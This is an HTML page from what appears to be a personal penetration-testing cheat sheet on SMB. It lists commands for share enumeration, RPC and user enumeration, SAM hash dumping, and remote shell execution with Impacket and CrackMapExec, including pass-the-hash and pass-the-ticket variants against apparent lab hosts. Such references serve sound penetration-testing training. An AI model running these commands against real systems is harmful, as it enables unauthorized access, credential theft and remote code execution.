<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentest CheatSheet | Pentest CheatSheet</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Pentest CheatSheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pentest CheatSheet" />
<meta property="og:description" content="Pentest CheatSheet" />
<link rel="canonical" href="http://localhost:4000/zNew/Services/SMB.html" />
<meta property="og:url" content="http://localhost:4000/zNew/Services/SMB.html" />
<meta property="og:site_name" content="Pentest CheatSheet" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentest CheatSheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Services/SMB.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Pentest CheatSheet</h1>
        </a>
        <h2>Pentest CheatSheet</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="interacting">Interacting</h1>
<h2 id="show-avaiable-shares">Show avaiable shares</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec</span>
<span class="nv">$ </span>crackmapexec smb 10.129.42.197 <span class="nt">-u</span> <span class="s2">"user"</span> <span class="nt">-p</span> <span class="s2">"password"</span> <span class="nt">--shares</span>
<span class="nv">$ </span>crackmapexec smb 172.16.5.5 <span class="nt">-u</span> forend <span class="nt">-p</span> Klmcargo2 <span class="nt">-M</span> spider_plus <span class="nt">--share</span> <span class="s1">'Department Shares'</span>

<span class="c"># smbmap</span>
<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.129.14.128
<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.129.14.128 <span class="nt">-r</span> notes
<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.129.14.128 <span class="nt">--download</span> <span class="s2">"notes</span><span class="se">\n</span><span class="s2">ote.txt"</span>
<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.129.14.128 <span class="nt">--upload</span> test.txt <span class="s2">"notes</span><span class="se">\t</span><span class="s2">est.txt"</span>

<span class="c"># smbclient</span>
<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.129.14.128
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-N</code> suppresses the password prompt</li>
  <li><code class="language-plaintext highlighter-rouge">-L</code> want to retrieve a list of available shares on the remote host</li>
</ul>

<h2 id="connecting">Connecting</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-U</span> bob //10.129.42.253/users
<span class="nv">$ </span>smbclient <span class="nt">-U</span> user <span class="se">\\\\</span>10.129.42.197<span class="se">\\</span>SHARENAME

<span class="c"># PTH</span>
<span class="nv">$ </span>smbclient.py <span class="nt">-hashes</span><span class="s2">":&lt;hash&gt;"</span> &lt;user&gt;@&lt;ip&gt;
</code></pre></div></div>

<h2 id="download-files">Download Files</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get prep-prod.txt 
</code></pre></div></div>

<h1 id="footprinting">Footprinting</h1>
<h2 id="nmap">Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap 10.129.14.128 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p139</span>,445
<span class="nv">$ </span>nmap <span class="nt">--script</span> smb-os-discovery.nse <span class="nt">-p445</span> 10.10.10.40
</code></pre></div></div>

<h2 id="remote-procedure-call-rpc">Remote Procedure Call (RPC)</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rpcclient &lt;IP&gt; <span class="nt">-U</span> <span class="s2">""</span>
<span class="nv">$ </span>rpcclient <span class="nt">-U</span><span class="s1">'%'</span> &lt;IP&gt;
<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 172.16.5.5
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th>Query</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>srvinfo</td>
      <td>Server information.</td>
    </tr>
    <tr>
      <td>enumdomains</td>
      <td>Enumerate all domains that are deployed in the network.</td>
    </tr>
    <tr>
      <td>querydominfo</td>
      <td>Provides domain, server, and user information of deployed domains.</td>
    </tr>
    <tr>
      <td>netshareenumall</td>
      <td>Enumerates all available shares.</td>
    </tr>
    <tr>
      <td>netsharegetinfo <share></share></td>
      <td>Provides information about a specific share.</td>
    </tr>
    <tr>
      <td>enumdomusers</td>
      <td>Enumerates all domain users.</td>
    </tr>
    <tr>
      <td>queryuser <RID></RID></td>
      <td>Provides information about a specific user.</td>
    </tr>
  </tbody>
</table>

<h2 id="impacket---samrdumppy-brute-forcing-user-rids">Impacket - Samrdump.py (Brute Forcing User RIDs)</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>samrdump.py 10.129.14.128
</code></pre></div></div>

<h2 id="enum4linux-ng">Enum4Linux-ng</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/cddmp/enum4linux-ng.git
<span class="nv">$ </span><span class="nb">cd </span>enum4linux-ng
<span class="nv">$ </span>pip3 <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
<span class="nv">$ </span>./enum4linux-ng.py &lt;IP&gt; <span class="nt">-A</span> <span class="nt">-C</span>
</code></pre></div></div>

<h1 id="remote-code-execution">Remote Code Execution</h1>
<ul>
  <li>Impacket PsExec - Python PsExec like functionality example using RemComSvc.</li>
  <li>Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.</li>
  <li>Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</li>
  <li>CrackMapExec - includes an implementation of smbexec and atexec.</li>
  <li>Metasploit PsExec - Ruby PsExec implementation.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ impacket-psexec -h
$ impacket-psexec administrator:'Password123!'@10.10.110.17
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
</code></pre></div></div>

<h2 id="interactive-shell">interactive-shell</h2>
<p><strong>Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py]</strong>
One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.</p>

<p>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>impacket-psexec &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;
<span class="nv">$ </span>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;

<span class="c"># PTH</span>
<span class="nv">$ </span>impacket-psexec <span class="nt">-hashes</span> <span class="s2">":&lt;hash&gt;"</span>&lt;user&gt;@&lt;ip&gt;<span class="sb">`</span>
<span class="nv">$ </span>psexec.py <span class="nt">-hashes</span> <span class="s2">":&lt;hash&gt;"</span>&lt;user&gt;@&lt;ip&gt;

<span class="c"># PTT - Same as PassTheHash but use -k and -no-pass </span>
<span class="nv">$ </span>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target-ip</span> 172.16.5.5
<span class="nv">$ </span>psexec.py <span class="nt">-dc-ip</span> IP <span class="nt">-target-ip</span> <span class="nv">$IP</span> <span class="nt">-no-pass</span> <span class="nt">-k</span> &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;target machine name&gt;.&lt;DOMAIN&gt; -&gt; goat
<span class="nv">$ </span>psexec.py <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-no-pass</span> <span class="nt">-k</span> &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;
</code></pre></div></div>

<h3 id="pseudo-shell-file-write-and-read">pseudo-shell (file write and read)</h3>
<h4 id="impacket-toolkit">Impacket Toolkit</h4>
<p><strong>Atexec.py [https://github.com/fortra/impacket/blob/master/examples/atexec.py]</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>atexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; <span class="s2">"command"</span> 

<span class="c"># PTH</span>
<span class="nv">$ </span>atexec.py <span class="nt">-hashes</span> <span class="s2">":&lt;hash&gt;"</span> &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; <span class="s2">"command"</span>

<span class="c"># PTT</span>
<span class="nv">$ </span>atexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; <span class="s2">"command"</span> <span class="nt">-k</span> <span class="nt">-no-pass</span>
</code></pre></div></div>

<p><strong>Smbexec.py [https://github.com/fortra/impacket/blob/master/examples/smbexec.py]</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;

<span class="c"># PTH</span>
<span class="nv">$ </span>smbexec.py <span class="nt">-hashes</span> <span class="s2">":&lt;hash&gt;"</span> &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; 

<span class="c"># PTT</span>
<span class="nv">$ </span>smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
</code></pre></div></div>

<p><strong>Wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py]</strong>
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;

<span class="c"># PTH</span>
<span class="nv">$ </span>wmiexec.py <span class="nt">-hashes</span><span class="s2">":&lt;hash&gt;"</span> &lt;user&gt;@&lt;ip&gt; 
</code></pre></div></div>

<p><strong>Dcomexec.py [https://github.com/fortra/impacket/blob/master/examples/dcomexec.py]</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>dcomexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;

<span class="c"># PTH</span>
<span class="nv">$ </span>dcomexec.py <span class="nt">-hashes</span> <span class="s2">":&lt;hash&gt;"</span>&lt;user&gt;@&lt;ip&gt; 
</code></pre></div></div>

<p><strong>CrackMapExec</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearText</span>
<span class="nv">$ </span>crackmapexec smb &lt;ip&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;pssword&gt; <span class="nt">-x</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="nt">--exec-method</span> smbexec
<span class="nv">$ </span>crackmapexec smb &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt; password&gt; <span class="nt">-d</span> &lt;domain&gt;
<span class="nv">$ </span>crackmapexec smb &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt; password&gt; <span class="nt">-local-auth</span>

<span class="c"># PTH</span>
<span class="nv">$ </span>crackmapexec smb &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-H</span> <span class="s1">':&lt;hash&gt;'</span> 
<span class="nv">$ </span>crackmapexec smb &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-H</span> <span class="s1">':&lt;hash&gt;'</span> <span class="nt">--local-auth</span>
</code></pre></div></div>


      </section>
    </div>
  </body>
</html>
